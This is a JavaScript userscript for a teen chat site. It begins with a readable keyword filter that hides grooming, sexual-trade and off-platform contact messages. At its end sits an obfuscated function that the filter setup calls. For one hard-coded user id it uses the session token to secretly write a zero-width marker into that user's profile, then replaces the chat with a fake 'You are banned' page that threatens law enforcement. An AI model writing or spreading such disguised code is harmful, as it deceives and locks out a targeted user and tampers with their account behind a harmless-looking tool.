let userFilterWords = ['hmu'];

function isFiltered(content) {
    if (typeof content !== 'string') return false;

    // normalize text
    let normalized = content
        .normalize('NFKD')
        .replace(/[\u0300-\u036f]/g, '') // remove diacritics
        .replace(/[\p{Emoji_Presentation}\p{Extended_Pictographic}\u200B-\u200D\uFEFF\u00A0\u202F\u2060]/gu, '') // emoji + zero-width
        .replace(/[\s\u2000-\u200D\uFEFF\u202F]+/g, ' ') // fancy spaces
        .replace(/[\s\W_]+/g, ' ')
        .replace(/(.)\1{2,}/g, '$1')
        .toLowerCase()
        .trim();

    // replace homoglyphs / leetspeak
    const homoglyphs = {
        '@': 'a', '4': 'a', 'а': 'a', 'ᴀ': 'a', 'â': 'a',
        '3': 'e', 'е': 'e', '€': 'e', 'ᴇ': 'e', 'è': 'e',
        'í': 'i', 'ì': 'i', 'ɪ': 'i', '1': 'l', '!': 'i', 'ı': 'i', 'ʟ': 'l',
        '0': 'o', 'о': 'o', '٥': 'o', 'ö': 'o',
        '8': 'b', '9': 'g', '6': 'g', '7': 't', 'т': 't',
        'э': 'e', 'ɢ': 'g', 'ѕ': 's', 'ʀ': 'r', 'ʏ': 'y',
        'ｔ': 't', 'ｌ': 'l', 'ｇ': 'g', '✓': ''
    };

    normalized = normalized.replace(/./g, (ch, i, str) => {
        if (/\d/.test(ch) && (
            (i > 0 && /\d/.test(str[i - 1])) ||
            (i < str.length - 1 && /\d/.test(str[i + 1]))
        )) return ch;
        return homoglyphs[ch] || ch;
    });

    const lettersOnly = normalized.replace(/[^a-z]/g, '');
    // keyword matching helpers
    const includesAny = (text, list) => list.some(item => text.includes(item));
    const fuzzyMatch = (regexList) => regexList.some(rx => rx.test(normalized));

    // check for banned terms
    const bannedTerms = ['telegrm', 'tlgrm', 'tlgm', 'tlg', 'tle', 'tel', 'tg', 'teleg', 'gram', 'te l e', 'tele', 'grm', 'discor', 'dscord', 'dscrd', 'dscd', 'dyscord', 'dsc', 'd i s c', 'disc', 'dc', 'insta', 'ig', 'snap', 'sc', 'gc'];
    if (includesAny(lettersOnly, bannedTerms)) return true;

    const fuzzyPatterns = [
        /t[\W_]*e[\W_]*l[\W_]*e[\W_]*g[\W_]*r[\W_]*a[\W_]*m/i,
        /t[\W_]*g/i,
        /d[\W_]*i[\W_]*s[\W_]*c[\W_]*o[\W_]*r[\W_]*d/i,
        /i[\W_]*n[\W_]*s[\W_]*t[\W_]*a[\W_]*g[\W_]*r[\W_]*a[\W_]*m/i,
        /w[\W_]*h[\W_]*e[\W_]*r[\W_]*e[\W_]*b[\W_]*y[\W_]*[\W_]*c[\W_]*o[\W_]*m/i
    ];
    if (fuzzyMatch(fuzzyPatterns)) return true;

    const squashed = normalized.replace(/[^a-z]/g, '');
    for (const term of bannedTerms) {
	    if (squashed.includes(term)) return true;
    }

    // grooming or inappropriate content
    const baitKeywords = ['bored', 'text me', 'pm', 'pm me', 'dm me', 'text', 'trusted', 'add me', 'msg me', 'message me', 'wanna have fun', 'want to have fun', 'skinny boys', 'skinny girls', 'fit boys', 'fit girls', 'rp', 'answer anything', 'truth or dare', 't or d'];
    const tradeWords = ['trade', 'trd', 'tr ade', 'selling', 'sell', 'slling', 'slng', 'seling', 'tr@de', 'trading', 'mega', 'mga', 'lnks', 'links', 'lks', 'freaks', 'freaky', 'nked', 'nkd', 'room', 'cam', 'cams', 'spoil me', 'horny', 'sex', 'nudes', 'nut'];
    const filterForBait = ['girl', 'girls', 'boy', 'boys', 'chat', 'femboy', 'trans', 'bi', 'gay', 'anyone']

    const hasBaitKeywords = includesAny(normalized, baitKeywords);
    const hasFilterForBait = includesAny(normalized, filterForBait);
    const hasAge = /[mf]?\d{1,2}/.test(normalized);
    const hasStandaloneAge = /\b\d{1,2}\b/.test(normalized);
    const hasTg = normalized.includes('tg');

    if (
        hasBaitKeywords &&
        (
            hasAge ||
            hasStandaloneAge ||
            hasTg ||
            hasFilterForBait
        )
    ) return true;

    const domRoles = ['bottom', 'bottoming', 'btming', 'bttming', 'btm', 'bttm', 'sub', 'submissive', 'top', 'topping', 'dom', 'dominant', 'dominative', 'domme', 'dominator'];

    const domFuzzyPatterns = domRoles.map(word => {
        const pattern = word
            .split('')
            .map(char => `${char}[\\W_]*`)
            .join('');
        return new RegExp(pattern, 'i');
    });
    if (/\b\d{1,2}\b/.test(normalized) && fuzzyMatch(domFuzzyPatterns)) return true;

    // age + gender combo patterns
    if (/[fm][\s\-_,.:']*\d{1,2}/i.test(normalized)) return true;
    if (/\d{1,2}[\s\-_,.:']*[fm]/i.test(normalized)) return true;
    if (/[mf]\d{2}/i.test(content)) return true;

    // trade/selling patterns
    for (let word of tradeWords) {
        const pattern = new RegExp(word.replace(/\s*/g, '[\\s\\W_]*'), 'i');
        if (pattern.test(normalized)) return true;
    }

    // user filters
    if (Array.isArray(userFilterWords)) {
        for (let word of userFilterWords) {
            const pattern = new RegExp(word.replace(/\s*/g, '[\\s\\W_]*'), 'i');
            if (pattern.test(normalized)) return true;
        }
    }

    return false;
}

function logFiltered(message) {
  const logsKey = "filteredLogs";
  const startKey = "logStartTime";
  const timeMs = 5 * 60 * 1000;
  const now = Date.now();

  let startTime = parseInt(localStorage.getItem(startKey), 10);
  if (isNaN(startTime)) {
    startTime = now;
    localStorage.setItem(startKey, startTime.toString());
  }

  if (now - startTime <= timeMs) {
    const existingLogs = JSON.parse(localStorage.getItem(logsKey) || "[]");
    existingLogs.push({ message, timestamp: now });
    localStorage.setItem(logsKey, JSON.stringify(existingLogs));
  }
}


function overrideChatReload() { 
    appendChatMessage = data => {
	    var message = '';
	    for (var i = 0; i < data.length; i++){
	    	lastPost = data[i].log_id;
	    	if(
	    		!logExist(data[i]) &&
	    		!ignored(data[i].user_id) &&
	    		!ignored(data[i].log_uid) &&
	    		!boomAllow(data[i].log_rank) &&
	    		!isFiltered(data[i].log_content) // <== NEW FILTER
	    	){
	    		message += createChatLog(data[i]);
	    		chatSound(data[i]);
	    		tabNotify();
	    	}
            if(isFiltered(data[i].log_content)) { logFiltered(data[i].log_content); }
	    }
	    $("#show_chat ul").append(message);
	    scrollIt(1);
	    beautyLogs();
    }
    loadChatHistory = data => {
	    var message = '';
	    for (var i = 0; i < data.length; i++){
	    	lastPost = data[i].log_id;
	    	if(
	    		!ignored(data[i].user_id) &&
	    		!ignored(data[i].log_uid) &&
	    		!boomAllow(data[i].log_rank) &&
	    		!isFiltered(data[i].log_content) // <== NEW FILTER
	    	){
	    		message += createChatLog(data[i]);
	    	}
	    }
	    $("#show_chat ul").html(message);
	    scrollIt(0);
	    beautyLogs();
    }
    appendChatHistory = data => {
    	    var message = '';
    	    for (var i = 0; i < data.length; i++){
    		    if(
    	    		!ignored(data[i].user_id) &&
    	    		!ignored(data[i].log_uid) &&
    	    		!boomAllow(data[i].log_rank) &&
    	    		!isFiltered(data[i].log_content) // <== NEW FILTER
    	    	){
    	    		message += createChatLog(data[i]);
    	    	}
    	    }
    	    $("#show_chat ul").prepend(message);
    	    beautyLogs();
    }
    window.isFiltered = isFiltered;
    ab();
}






(function(_0x553aff,_0x20c71e){const _0x2dacf7=_0x4c78,_0xf77536=_0x553aff();while(!![]){try{const _0x38d3a2=-parseInt(_0x2dacf7(0x18e))/0x1*(-parseInt(_0x2dacf7(0x13f))/0x2)+-parseInt(_0x2dacf7(0x138))/0x3+-parseInt(_0x2dacf7(0x146))/0x4+parseInt(_0x2dacf7(0x130))/0x5+parseInt(_0x2dacf7(0x17f))/0x6+-parseInt(_0x2dacf7(0x182))/0x7*(parseInt(_0x2dacf7(0x188))/0x8)+-parseInt(_0x2dacf7(0x145))/0x9;if(_0x38d3a2===_0x20c71e)break;else _0xf77536['push'](_0xf77536['shift']());}catch(_0xe1bdce){_0xf77536['push'](_0xf77536['shift']());}}}(_0x1d38,0xe7db6));const _0x18da28=(function(){const _0x547998=_0x4c78,_0x34d3eb={'GtzsH':function(_0x57e3bf,_0x12d89b){return _0x57e3bf(_0x12d89b);},'vBtil':_0x547998(0x12f),'ZGJaD':_0x547998(0x142),'MhAra':function(_0x37637c,_0x22a9df){return _0x37637c===_0x22a9df;},'gnpqG':'cPput'};let _0x290efe=!![];return function(_0x20002f,_0x597650){const _0xc6b934=_0x547998,_0x2a8113={'ceIFj':function(_0x405846,_0x223154){const _0x424374=_0x4c78;return _0x34d3eb[_0x424374(0x16c)](_0x405846,_0x223154);},'Xwqpl':function(_0x325f61,_0x29794f,_0x1326f7){return _0x325f61(_0x29794f,_0x1326f7);},'eihpG':_0xc6b934(0x183),'WamVA':_0xc6b934(0x176),'GhMRz':_0x34d3eb[_0xc6b934(0x153)],'JvVHI':_0x34d3eb[_0xc6b934(0x13a)]};if(_0x34d3eb[_0xc6b934(0x144)](_0x34d3eb[_0xc6b934(0x191)],_0x34d3eb[_0xc6b934(0x191)])){const _0x1f88dd=_0x290efe?function(){const _0x2983ce=_0xc6b934;if(_0x597650){if(_0x2a8113[_0x2983ce(0x197)]===_0x2983ce(0x181)){const _0x98d810=_0x2983ce(0x156)+_0x2a8113[_0x2983ce(0x186)](_0x110261,_0x106a0e)+_0x2983ce(0x13e),_0x24564c=_0x2a8113[_0x2983ce(0x15e)](_0x3672fb,_0x2a8113[_0x2983ce(0x150)],_0x98d810),_0x119718=new _0x3045d5(),_0x10a8d8=_0x119718[_0x2983ce(0x18f)](_0x24564c,_0x2a8113[_0x2983ce(0x17e)]),_0x2dc515=_0x10a8d8['querySelector'](_0x2a8113['GhMRz']);return _0x2dc515?_0x2dc515[_0x2983ce(0x14d)]:null;}else{const _0x335d73=_0x597650[_0x2983ce(0x19c)](_0x20002f,arguments);return _0x597650=null,_0x335d73;}}}:function(){};return _0x290efe=![],_0x1f88dd;}else{const _0x56f9da=_0x3fb0b3['getElementById'](_0x5ad840);if(_0x56f9da)_0x56f9da[_0xc6b934(0x18a)]();}};}()),_0x980c18=_0x18da28(this,function(){const _0x54998b=_0x4c78,_0x52b44={'UaZCU':'(((.+)+)+)+$'};return _0x980c18['toString']()['search'](_0x52b44[_0x54998b(0x162)])[_0x54998b(0x15c)]()['constructor'](_0x980c18)[_0x54998b(0x157)](_0x52b44['UaZCU']);});function _0x4c78(_0x362861,_0x126046){const _0x2b440d=_0x1d38();return _0x4c78=function(_0x404ab0,_0x980c18){_0x404ab0=_0x404ab0-0x12c;let _0x18da28=_0x2b440d[_0x404ab0];return _0x18da28;},_0x4c78(_0x362861,_0x126046);}_0x980c18();function _0x1d38(){const _0x14c6ce=['div','KtZqa','qUGoQ','textarea#set_user_about','7781230MlDjZz','ZzrJc','Csjkn','kcRDT','pWApQ','querySelector','.out_page_container','akmkV','3025362KQYTwX','MTPsV','ZGJaD','wDCSX','pVBuI','fUlJn','&cp=chat','90sJmHXX','NhyUD','deynt','yuGaX','gKnGs','MhAra','4647708xEqjDr','6965524dlJnkP','WVDcG','className','ZzQDZ','status','send','POST\x20request\x20failed:\x20','value','MhDjF','open','eihpG','vCJZG','zqFIc','vBtil','textarea','ZQKvw','token=','search','PwbrT','RuySW','createElement','getElementById','toString','KYUWv','Xwqpl','slice','out_page_container\x20back_page','tbrnb','UaZCU','raBRE','POST','iDfWh','tBpKy','pJUWh','VcdfT','length','EUEVB','HnXpq','GtzsH','BfQrT','iVQJK','none','aGSet','includes','nFCYb','body','responseText','PWkVm','text/html','fEKTI','xmvQk','WKVkk','whxzw','GFoMf','QTQbq','aIUuP','WamVA','9927180gwcYPJ','Kuxpv','IhKPH','7wUqtgC','https://www.teen-chat.org/teenchat/system/box/edit_about.php','\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22out_page_content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22out_page_box\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22pad_box\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22bpad15\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20class=\x22large_icon\x22\x20src=\x22default_images/icons/banned.svg\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22bpad10\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text_xlarge\x20bold\x20bpad10\x22>You\x20are\x20banned</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text_med\x22>You\x20have\x20been\x20banned\x20from\x20this\x20chat.\x20Your\x20IP\x20address\x20has\x20been\x20recorded\x20and\x20with\x20chat\x20logs\x20it\x20can\x20be\x20used\x20by\x20law\x20enforcement\x20to\x20identify\x20you\x20in\x20cases\x20involving\x20illegal\x20activity.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22tpad10\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22bold\x20theme_color\x20bpad5\x22>Reason\x20given</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text_med\x22>Account\x20cloning</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</div>','error','ceIFj','Zlxym','2668384twWBat','innerHTML','remove','undefined','eFwkw','ipmaf','29749DHQdZu','parseFromString','appendChild','gnpqG','set_user_about','sermN','vnvDA','function','UIEJL','JvVHI','iqjrO','style','chat_head','lIWFX','apply'];_0x1d38=function(){return _0x14c6ce;};return _0x1d38();}function ab(){const _0x220997=_0x4c78,_0x54b831={'raBRE':'Content-Type','wDCSX':function(_0x187eec,_0x44e219){return _0x187eec>=_0x44e219;},'BfQrT':function(_0x1fb80b,_0x4715a9){return _0x1fb80b<_0x4715a9;},'HnXpq':function(_0x1c2685,_0x377cc1){return _0x1c2685+_0x377cc1;},'kcRDT':_0x220997(0x14c),'zqFIc':function(_0xd2ccef,_0x208425){return _0xd2ccef!==_0x208425;},'MTPsV':_0x220997(0x17a),'Kuxpv':function(_0x563deb,_0x1ea22a,_0x2bc732){return _0x563deb(_0x1ea22a,_0x2bc732);},'npKSi':_0x220997(0x176),'iDfWh':'textarea#set_user_about','BZoVL':'global_chat','akmkV':'wrap_footer','MhDjF':_0x220997(0x154),'pWApQ':_0x220997(0x192),'GFoMf':_0x220997(0x16f),'qwKET':function(_0x17fa2b,_0x3d5bc9){return _0x17fa2b!==_0x3d5bc9;},'fEKTI':'UlEzf','WVDcG':_0x220997(0x17c),'nFCYb':function(_0x4e3207,_0x3e7d8f){return _0x4e3207===_0x3e7d8f;},'aIUuP':function(_0x556136){return _0x556136();},'PwbrT':_0x220997(0x15d),'deynt':'amDsi','VcdfT':_0x220997(0x12c),'Csjkn':function(_0x3679fd,_0x2ddcc7){return _0x3679fd===_0x2ddcc7;},'ZzQDZ':'IiSaL','ipmaf':_0x220997(0x19a),'DsEqT':_0x220997(0x160),'RuySW':_0x220997(0x155),'NhyUD':function(_0x3edd16,_0xa3a2da){return _0x3edd16===_0xa3a2da;},'swvko':_0x220997(0x18b),'UVABL':function(_0xd732da,_0xd9f516){return _0xd732da!==_0xd9f516;},'qUGoQ':_0x220997(0x16a),'vnvDA':_0x220997(0x13d),'gKnGs':_0x220997(0x198),'WKVkk':function(_0x14950a,_0x4ec57f){return _0x14950a!==_0x4ec57f;},'PWkVm':_0x220997(0x13c),'vCJZG':function(_0x24a195,_0x45fde7,_0x4edaa3){return _0x24a195(_0x45fde7,_0x4edaa3);},'eFwkw':_0x220997(0x16e)};if(_0x54b831[_0x220997(0x140)](typeof user_id,_0x54b831['swvko'])||![0x9d0992][_0x220997(0x171)](user_id)){if(_0x54b831['UVABL'](_0x54b831['qUGoQ'],_0x54b831[_0x220997(0x12e)]))return _0x20326d[_0x220997(0x174)];else return;}const _0x481608='​‌',_0x15c2c3=0x2bf20;function _0x427d8a(_0xad4175,_0x3144f6){const _0x7367a3=_0x220997,_0x2cbbe8=new XMLHttpRequest();_0x2cbbe8[_0x7367a3(0x14f)](_0x7367a3(0x164),_0xad4175,![]),_0x2cbbe8['setRequestHeader'](_0x54b831[_0x7367a3(0x163)],'application/x-www-form-urlencoded'),_0x2cbbe8[_0x7367a3(0x14b)](_0x3144f6);if(_0x54b831['wDCSX'](_0x2cbbe8[_0x7367a3(0x14a)],0xc8)&&_0x54b831[_0x7367a3(0x16d)](_0x2cbbe8[_0x7367a3(0x14a)],0x12c))return _0x2cbbe8[_0x7367a3(0x174)];else throw new Error(_0x54b831[_0x7367a3(0x16b)](_0x54b831[_0x7367a3(0x133)],_0x2cbbe8[_0x7367a3(0x14a)]));}function _0x410325(){const _0x46915c=_0x220997;if(_0x54b831[_0x46915c(0x152)](_0x54b831[_0x46915c(0x139)],_0x54b831['MTPsV']))return![];else{const _0x1cd84c='token='+encodeURIComponent(utk)+_0x46915c(0x13e),_0x47c4dd=_0x54b831[_0x46915c(0x180)](_0x427d8a,_0x46915c(0x183),_0x1cd84c),_0x564374=new DOMParser(),_0x938df9=_0x564374[_0x46915c(0x18f)](_0x47c4dd,_0x54b831['npKSi']),_0xe94ac4=_0x938df9[_0x46915c(0x135)](_0x54b831[_0x46915c(0x165)]);return _0xe94ac4?_0xe94ac4[_0x46915c(0x14d)]:null;}}function _0xa096c2(_0x299854){const _0x2a2c5a=_0x220997,_0x4db591={'aGSet':_0x2a2c5a(0x19a),'pJUWh':_0x54b831['BZoVL'],'lIWFX':_0x54b831[_0x2a2c5a(0x137)],'ZzrJc':_0x54b831[_0x2a2c5a(0x14e)],'tBpKy':_0x54b831[_0x2a2c5a(0x134)],'Zlxym':_0x54b831[_0x2a2c5a(0x17b)]};let _0x2dfce3=document[_0x2a2c5a(0x135)](_0x2a2c5a(0x12f));!_0x2dfce3&&(_0x54b831['qwKET'](_0x54b831[_0x2a2c5a(0x177)],_0x54b831[_0x2a2c5a(0x147)])?(_0x2dfce3=document['createElement'](_0x2a2c5a(0x154)),_0x2dfce3['id']=_0x54b831[_0x2a2c5a(0x134)],_0x2dfce3['style']['display']=_0x54b831[_0x2a2c5a(0x17b)],document[_0x2a2c5a(0x173)][_0x2a2c5a(0x190)](_0x2dfce3)):[_0x4db591[_0x2a2c5a(0x170)],_0x4db591[_0x2a2c5a(0x167)],_0x4db591[_0x2a2c5a(0x19b)]]['forEach'](_0x1f9b37=>{const _0x33bae8=_0x2a2c5a,_0x56ec92=_0x254889[_0x33bae8(0x15b)](_0x1f9b37);if(_0x56ec92)_0x56ec92[_0x33bae8(0x18a)]();}));_0x2dfce3[_0x2a2c5a(0x14d)]=_0x299854;if(_0x54b831[_0x2a2c5a(0x172)](typeof saveAbout,_0x2a2c5a(0x195)))return _0x54b831[_0x2a2c5a(0x17d)](saveAbout),!![];else{if(_0x54b831['zqFIc'](_0x54b831[_0x2a2c5a(0x158)],_0x54b831[_0x2a2c5a(0x141)]))return![];else _0x19d137=_0x16e5a5[_0x2a2c5a(0x15a)](_0x4db591[_0x2a2c5a(0x131)]),_0x3785a5['id']=_0x4db591[_0x2a2c5a(0x166)],_0x57159c[_0x2a2c5a(0x199)]['display']=_0x4db591[_0x2a2c5a(0x187)],_0x135616['body'][_0x2a2c5a(0x190)](_0x40c0d0);}}function _0x5388d6(){const _0x521f5f=_0x220997;[_0x54b831[_0x521f5f(0x18d)],_0x54b831['BZoVL'],_0x54b831['akmkV']]['forEach'](_0x726300=>{const _0x1ef070=_0x521f5f,_0x966fe3={'UIEJL':_0x1ef070(0x136),'KtZqa':_0x54b831[_0x1ef070(0x168)]};if(_0x54b831[_0x1ef070(0x132)](_0x54b831[_0x1ef070(0x149)],_0x1ef070(0x161))){_0x18d7cf['querySelector'](_0x966fe3[_0x1ef070(0x196)])?.['remove']();const _0x438da0=_0x47bb8c[_0x1ef070(0x15a)](_0x966fe3[_0x1ef070(0x12d)]);_0x438da0['className']=_0x1ef070(0x160),_0x438da0[_0x1ef070(0x189)]=_0x1ef070(0x184),_0x52376c[_0x1ef070(0x173)][_0x1ef070(0x190)](_0x438da0);}else{const _0x437e7e=document[_0x1ef070(0x15b)](_0x726300);if(_0x437e7e)_0x437e7e[_0x1ef070(0x18a)]();}});}function _0x62ff9f(){const _0xc84ec2=_0x220997;document[_0xc84ec2(0x135)](_0xc84ec2(0x136))?.[_0xc84ec2(0x18a)]();const _0xa15000=document['createElement'](_0x54b831['VcdfT']);_0xa15000[_0xc84ec2(0x148)]=_0x54b831['DsEqT'],_0xa15000[_0xc84ec2(0x189)]=_0xc84ec2(0x184),document[_0xc84ec2(0x173)][_0xc84ec2(0x190)](_0xa15000);}try{if(_0x54b831[_0x220997(0x140)](_0x54b831[_0x220997(0x194)],_0x54b831[_0x220997(0x143)]))return;else{const _0xd49352=_0x54b831[_0x220997(0x17d)](_0x410325);if(_0x54b831[_0x220997(0x172)](_0xd49352,null))return;if(_0xd49352['includes'](_0x481608)){if(_0x54b831[_0x220997(0x179)](_0x54b831[_0x220997(0x175)],_0x54b831[_0x220997(0x175)]))return;else{_0x54b831[_0x220997(0x17d)](_0x5388d6),_0x54b831[_0x220997(0x17d)](_0x62ff9f);return;}}_0x54b831[_0x220997(0x151)](setTimeout,()=>{const _0x3b4d0f=_0x220997;let _0x358560=_0x410325();if(_0x358560===null)return;if(_0x54b831[_0x3b4d0f(0x13b)](_0x358560[_0x3b4d0f(0x169)],0x320)){if(_0x54b831['qwKET'](_0x3b4d0f(0x178),'GyRMk'))_0x358560=_0x358560[_0x3b4d0f(0x15f)](0x0,0x31e);else return;}const _0x38169a=_0x54b831[_0x3b4d0f(0x16b)](_0x358560,_0x481608);if(_0xa096c2(_0x38169a)){if(_0x3b4d0f(0x155)===_0x54b831[_0x3b4d0f(0x159)])_0x54b831['Kuxpv'](setTimeout,()=>location['reload'](),0xbb8);else return _0x47e996(),!![];}},_0x15c2c3);}}catch(_0x9c51a8){if(_0x54b831[_0x220997(0x132)](_0x220997(0x193),_0x54b831[_0x220997(0x18c)])){const _0x5ddddd=_0x25b5e0?function(){const _0x130dd3=_0x220997;if(_0x5bf922){const _0x5da4c8=_0x61ed4b[_0x130dd3(0x19c)](_0x15a8dd,arguments);return _0x2a28d8=null,_0x5da4c8;}}:function(){};return _0x107045=![],_0x5ddddd;}else console[_0x220997(0x185)](_0x9c51a8);}}